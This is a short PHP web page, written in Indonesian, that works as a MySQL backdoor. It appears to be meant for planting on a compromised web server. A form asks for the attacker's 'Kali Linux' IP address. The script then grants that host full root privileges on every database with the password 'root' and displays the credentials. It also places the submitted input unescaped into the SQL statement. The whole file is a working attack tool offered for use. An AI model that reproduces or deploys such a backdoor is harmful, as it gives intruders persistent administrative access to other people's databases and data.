<!doctype html>
<html>
<head>
    <title>BackDoor Mysql</title>
    <meta charset='utf-8'>
    <meta name='robots' content='noindex, nofollow, noarchive'>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>
        body { background: #f0f0f0; color: #222222; font-family: 'Arial', sans-serif; }
        h1 { background: #E7E7E7; padding: 10px; border-radius: 8px; text-align: center; }
        .container { padding: 20px; }
        form { display: flex; flex-direction: column; align-items: center; margin-top: 20px; }
        label { margin-bottom: 10px; font-weight: bold; }
        input[type="text"], input[type="number"] { font-size: 16px; width: 300px; padding: 10px; border: 1px solid #cccccc; border-radius: 4px; }
        button { margin-top: 10px; padding: 10px 20px; font-size: 16px; border: none; border-radius: 4px; background-color: #4CAF50; color: white; cursor: pointer; }
        button:hover { background-color: #45a049; }
        .success-message { color: green; font-weight: bold; margin-top: 20px; }
    </style>
</head>
<body>
<div class="container">
    <h1>Selamat Datang di BackDoor MYSQL</h1>
    <form method="POST">
        <label for="allowed_host">Masukkan IP Kali Linux:</label>
        <input type="text" name="allowed_host" id="allowed_host" required>
        <button type="submit">Submit</button>
    </form>

    <?php
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        $server = "localhost";
        $username = "root";
        $password = "";

        // Check if allowed_host is set and not empty
        if (isset($_POST['allowed_host']) && !empty(trim($_POST['allowed_host']))) {
            $allowed_host = trim($_POST['allowed_host']);

            try {
                $pdo = new PDO("mysql:host=$server", $username, $password);
                $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

                $query = "GRANT ALL PRIVILEGES ON *.* TO 'root'@'$allowed_host' IDENTIFIED BY 'root' WITH GRANT OPTION;";
                $pdo->exec($query);
                $pdo->exec("FLUSH PRIVILEGES;");

                $local_ip = gethostbyname(gethostname());
                echo "<div class='success-message' style='text-align: center;'><h1>Akses berhasil diberikan untuk ip $allowed_host</h1></div>";
                echo "<div class='success-message' style='text-align: center;'><h1> username root & password root</h1></div>";
                echo "<div class='success-message' style='text-align: center;'><h1>mysql -h IpServer -u root -p</h1></div>";
            } catch (PDOException $e) {
                echo "Error: " . $e->getMessage();
            }
        } else {
            //echo "<div class='success-message' style='text-align: center;'></div>";
        }
    }
    ?>
</div>
</body>
</html>
